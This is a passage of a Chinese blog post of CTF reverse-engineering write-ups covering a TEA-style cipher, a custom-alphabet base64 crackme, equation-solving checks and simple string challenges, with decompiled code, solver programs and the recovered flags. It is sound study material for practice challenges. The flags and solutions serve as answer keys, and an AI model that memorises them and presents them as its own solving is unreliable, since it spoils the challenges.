= <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; j += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 = *(&amp;v6 + j);</span><br><span class="line">    dword_60107C = *(&amp;v6 + j + <span class="number">1</span>);</span><br><span class="line">    sub_400686(&amp;dword_601078, &amp;unk_601060);</span><br><span class="line">    *(&amp;v11 + j) = dword_601078;</span><br><span class="line">    *(&amp;v11 + j + <span class="number">1</span>) = dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_400770(&amp;v11) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO NO NO~ &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You seccess half\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do not forget to change input to hex and combine~\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ByeBye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题分为两步，我们从下往上分析。</p><h2 id="sub-400770"><a href="#sub-400770" class="headerlink" title="sub_400770"></a>sub_400770</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_400770</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">2</span>] - a1[<span class="number">3</span>] != <span class="number">2225223423L</span>L || a1[<span class="number">3</span>] + a1[<span class="number">4</span>] != <span class="number">4201428739L</span>L || a1[<span class="number">2</span>] - a1[<span class="number">4</span>] != </span><br><span class="line">    <span class="number">1121399208L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *a1 != <span class="number">-548868226</span> || a1[<span class="number">5</span>] != <span class="number">-2064448480</span> || a1[<span class="number">1</span>] != <span class="number">550153460</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数简单，计算方程组就行。</p><blockquote><p>a1[2] - a1[3] == 2225223423<br>a1[3] + a1[4] == 4201428739<br>a1[2] - a1[4] == 1121399208<br>结果：a1[2]3774025685  a1[3]=1548802262  a1[4]=2652626477</p></blockquote><h2 id="sub-400686"><a href="#sub-400686" class="headerlink" title="sub_400686"></a>sub_400686</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400686</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, _DWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1;</span><br><span class="line">  v4 = a1[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x3F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 += <span class="number">1166789954</span>;</span><br><span class="line">    v3 += (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + *a2) ^ ((v4 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">    v4 += (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  result = v4;</span><br><span class="line">  a1[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1为flag，a[2]={2,2,3,4}<br>这个函数就是进行异或操作，我们将它逆过来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a[<span class="number">6</span>]=&#123;<span class="number">3746099070</span>,<span class="number">550153460</span>,<span class="number">3774025685</span>,<span class="number">1548802262</span>,<span class="number">2652626477</span>,<span class="number">2230518816</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> b[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3, v4,v5;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = a[i];</span><br><span class="line">        v4 = a[i + <span class="number">1</span>];</span><br><span class="line">        v5 = <span class="number">1166789954</span>*<span class="number">0x40</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x3F</span>; ++i) &#123;</span><br><span class="line">            v4 -= (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + b[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + b[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">            v3 -= (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + b[<span class="number">0</span>]) ^ ((v4 &gt;&gt; <span class="number">9</span>) + b[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">            v5 -= <span class="number">1166789954</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[i] = v3;</span><br><span class="line">        a[i + <span class="number">1</span>] = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%0x&quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出的十六进制再转为字符串。</p><blockquote><p>flag{re_is_great!}</p></blockquote><h1 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h1><p>ida32打开，进入main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [esp+0h] [ebp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [esp+80h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// [esp+84h] [ebp-10h]</span></span><br><span class="line">  HANDLE v7; <span class="comment">// [esp+88h] [ebp-Ch]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+90h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  v7 = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  v6 = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span>;</span><br><span class="line">  WriteFile(hFile, <span class="string">&quot;Enter password:\r\n&quot;</span>, <span class="number">0x12</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  ReadFile(v7, &amp;Buffer, <span class="number">0x80</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  v5 = sub_401260(&amp;Buffer, NumberOfBytesWritten - <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, v6) )</span><br><span class="line">    WriteFile(hFile, <span class="string">&quot;Correct!\r\n&quot;</span>, <span class="number">0xB</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    WriteFile(hFile, <span class="string">&quot;Wrong password\r\n&quot;</span>, <span class="number">0x11</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入第15行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__cdecl <span class="title">sub_401260</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ST24_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= a2 )</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v7 = *(v11++ + a1);</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= a2 )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v6 = *(v11++ + a1);</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= a2 )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = *(v11++ + a1);</span><br><span class="line">    v3 = v5 + (v7 &lt;&lt; <span class="number">16</span>) + (v6 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    v9[v10] = byte_413000[(v3 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v4 = v10 + <span class="number">1</span>;</span><br><span class="line">    v9[v4++] = byte_413000[(v3 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v9[v4++] = byte_413000[(v3 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v9[v4] = byte_413000[v5 &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v4 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_413040[a2 % <span class="number">3</span>]; ++i )</span><br><span class="line">    v9[<span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>) - i - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  v9[<span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再字符串中有：ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/<br>很明显的base64加密，但密码表变了，根据密码表的变化，将密文转换成正常的base64.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">52</span>]=<span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">52</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((flag[i]&lt;=<span class="string">&#x27;W&#x27;</span>&amp;&amp;flag[i]&gt;=<span class="string">&#x27;A&#x27;</span>)||(flag[i]&lt;=<span class="string">&#x27;w&#x27;</span>&amp;&amp;flag[i]&gt;=<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    flag[i]+=<span class="number">3</span>;  </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] == <span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">         flag[i] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] == <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">         flag[i] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] == <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">         flag[i] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] == <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">         flag[i] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">         flag[i] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] == <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">         flag[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i]&gt;=<span class="number">0</span>&amp;&amp;flag[i]&lt;=<span class="number">9</span>)</span><br><span class="line">         flag[i] = i;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出base64解码就行。</p><blockquote><p>flag{sh00ting_phish_in_a_barrel@flare-on.com}</p></blockquote><h1 id="Universe-final-answer"><a href="#Universe-final-answer" class="headerlink" title="Universe_final_answer"></a>Universe_final_answer</h1><p>ida64打开<br>进入main函数，然后跳转至本题的关键函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">sub_860</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er11</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1[<span class="number">1</span>];</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">2</span>];</span><br><span class="line">  v4 = a1[<span class="number">3</span>];</span><br><span class="line">  v5 = a1[<span class="number">4</span>];</span><br><span class="line">  v6 = a1[<span class="number">6</span>];</span><br><span class="line">  v7 = a1[<span class="number">5</span>];</span><br><span class="line">  v8 = a1[<span class="number">7</span>];</span><br><span class="line">  v9 = a1[<span class="number">8</span>];</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + <span class="number">-45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * </span><br><span class="line">    v3 == <span class="number">12613</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = a1[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">30</span> * v11 + <span class="number">-70</span> * v9 + <span class="number">-122</span> * v6 + <span class="number">-81</span> * v7 + <span class="number">-66</span> * v5 + <span class="number">-115</span> * v4 + <span class="number">-41</span> * v3 + <span class="number">-86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == <span class="number">-54400</span></span><br><span class="line">      &amp;&amp; <span class="number">-103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + <span class="number">-89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * v9 == <span class="number">-10283</span></span><br><span class="line">      &amp;&amp; <span class="number">71</span> * v6 + (v7 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * v5 + <span class="number">-111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span></span><br><span class="line">      &amp;&amp; <span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + <span class="number">-19</span> * v6 + <span class="number">99</span> * v7 + <span class="number">-117</span> * v5 + <span class="number">-69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == <span class="number">-2944</span></span><br><span class="line">      &amp;&amp; <span class="number">-54</span> * v11 + <span class="number">-23</span> * v8 + <span class="number">-82</span> * v3 + <span class="number">-85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == <span class="number">-2222</span></span><br><span class="line">      &amp;&amp; <span class="number">-83</span> * v11 + <span class="number">-111</span> * v7 + <span class="number">-57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == <span class="number">-13258</span></span><br><span class="line">      &amp;&amp; <span class="number">81</span> * v11 + <span class="number">-48</span> * v9 + <span class="number">66</span> * v8 + <span class="number">-104</span> * v6 + <span class="number">-121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + <span class="number">-85</span> * v2 + <span class="number">80</span> * v1 == <span class="number">-1559</span></span><br><span class="line">      &amp;&amp; <span class="number">101</span> * v11 + <span class="number">-85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + <span class="number">-83</span> * v5 + <span class="number">-101</span> * v4 + <span class="number">90</span> * v3 + <span class="number">-28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">99</span> * v11 + <span class="number">-28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + <span class="number">-18</span> * v7 + <span class="number">-127</span> * v5 + <span class="number">6</span> * v4 + <span class="number">-9</span> * v3 + <span class="number">-93</span> * v1 + <span class="number">58</span> * v2 == <span class="number">-1697</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是解方程，解出来后v2和v1互换，v7和v6互换。<br>结果：F0uRTy_7w@，输入到程序中得到flag，但我不会。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;F0uRTy_7w@_42&#125;</span><br></pre></td></tr></table></figure><h1 id="basic-re"><a href="#basic-re" class="headerlink" title="basic-re"></a>basic-re</h1><p>ida64打开，字符串里直接看到flag，这种题怎么这么靠后。</p><blockquote><p>flag{str1ngs_1s_y0ur_fr13nd}</p></blockquote><h1 id="hello-world-go"><a href="#hello-world-go" class="headerlink" title="hello_world_go"></a>hello_world_go</h1><p>ida64打开，进入main函数<br><img src="/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hello_world_go1.PNG"></p><p><img src="/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hello_world_go2.PNG"></p><blockquote><p>flag{hello_world_gogogo}</p></blockquote><h1 id="Cr0ssfun"><a href="#Cr0ssfun" class="headerlink" title="Cr0ssfun"></a>Cr0ssfun</h1><p>ida64打开，转一下字符就是flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a1[<span class="number">10</span>] == <span class="string">&#x27;p&#x27;</span> &amp;&amp; a1[<span class="number">13</span>] == <span 